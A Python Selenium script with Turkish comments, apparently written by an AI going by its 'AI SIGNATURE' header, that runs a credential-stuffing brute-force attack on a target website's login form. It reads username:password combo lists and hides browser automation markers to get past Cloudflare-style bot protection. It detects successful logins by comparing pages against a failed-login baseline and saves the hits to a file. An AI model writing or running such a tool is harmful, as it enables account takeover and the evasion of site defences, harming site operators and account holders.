# --- AI SIGNATURE: FINAL SELENIUM BRUTEFORCE ---
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
from tqdm import tqdm
import time
from colorama import Fore, Style, init

init(autoreset=True)

parser = argparse.ArgumentParser(description="Selenium ile Cloudflare korumalı login brute force aracı (combo wordlist)")
parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
parser.add_argument('--headless', action='store_true', help='Tarayıcıyı arka planda (görünmeden) çalıştır (HATA ALIRSANIZ BUNU KALDIRIN)')
args = parser.parse_args()
args.url = args.url.strip()

combos = []
with open(args.combo, encoding='utf-8', errors='ignore') as f:
    for line in f:
        line = line.strip()
        if not line or ':' not in line:
            continue
        username, password = line.split(':', 1)
        combos.append((username, password))

print(f"[+] {len(combos)} combo (username:password) yüklendi.")

chrome_options = Options()
if args.headless:
    print("DEBUG: Headless (arka plan) modda çalıştırılıyor.")
    chrome_options.add_argument('--headless')
else:
    print("DEBUG: Görünür tarayıcı modunda çalıştırılıyor.")
    
# Stabilite için ekstra ayarlar
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--window-size=1280x800')
chrome_options.add_argument("--disable-blink-features=AutomationControlled")
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option('useAutomationExtension', False)


success_log = open('success.txt', 'w', encoding='utf-8')
driver = None

try:
    print("DEBUG: Tarayıcı başlatılıyor...")
    driver = webdriver.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    driver.set_page_load_timeout(60)
    print(f"DEBUG: {args.url} adresine gidiliyor...")
    driver.get(args.url)
    time.sleep(5) 
    print("[+] Ana sayfaya erişildi.")

    # Formu ve inputları bul
    form = driver.find_element(By.TAG_NAME, 'form')
    inputs = form.find_elements(By.TAG_NAME, 'input')
    user_input = None
    pass_input = None
    for inp in inputs:
        inp_type = inp.get_attribute('type')
        if inp_type in ['text', 'email', 'user'] and not user_input:
            user_input = inp
        elif inp_type == 'password':
            pass_input = inp
    
    if not user_input or not pass_input:
        raise Exception("Kullanıcı adı veya şifre inputu bulunamadı!")
        
    print(f"[+] Login formu bulundu: user='{user_input.get_attribute('name')}', pass='{pass_input.get_attribute('name')}'")

    # Başarısız giriş referansı al
    user_input.send_keys("wronguser")
    pass_input.send_keys("wrongpass" + Keys.RETURN)
    time.sleep(3)
    fail_url = driver.current_url
    fail_html = driver.page_source

    with tqdm(total=len(combos), desc="Kombinasyonlar deneniyor", unit="combo") as pbar:
        for username, password in combos:
            try:
                if driver.current_url != args.url:
                    driver.get(args.url)
                    time.sleep(2)

                form = driver.find_element(By.TAG_NAME, 'form')
                inputs = form.find_elements(By.TAG_NAME, 'input')
                user_input = None
                pass_input = None
                for inp in inputs:
                    inp_type = inp.get_attribute('type')
                    if inp_type in ['text', 'email', 'user'] and not user_input:
                        user_input = inp
                    elif inp_type == 'password':
                        pass_input = inp

                if user_input and pass_input:
                    user_input.clear()
                    pass_input.clear()
                    user_input.send_keys(username)
                    pass_input.send_keys(password + Keys.RETURN)
                    time.sleep(3)

                    if driver.current_url != fail_url or driver.page_source != fail_html:
                        tqdm.write(Fore.GREEN + Style.BRIGHT + f"\n[!!!] BAŞARILI: {username}:{password}")
                        success_log.write(f"{username}:{password}\n")
                        success_log.flush()
                else:
                    tqdm.write(Fore.RED + "Döngü içinde form inputları bulunamadı.")

            except (NoSuchElementException, TimeoutException) as e:
                pbar.set_postfix_str(f"Form hatası: {e}", refresh=True)
                time.sleep(1)
            except Exception as e:
                pbar.set_postfix_str(f"Genel Hata: {e}", refresh=True)
                # Olası bir crash sonrası tarayıcıyı yeniden başlat
                driver.quit()
                driver = webdriver.Chrome(options=chrome_options)
                driver.get(args.url)
            
            pbar.update(1)

except Exception as e:
    print(f"\n{Fore.RED}KRİTİK HATA: {e}")
finally:
    if driver:
        driver.quit()
    success_log.close()
    print("\n[+] Tarama tamamlandı.")

# --- AI SIGNATURE: FINAL SELENIUM BRUTEFORCE BITIS --- 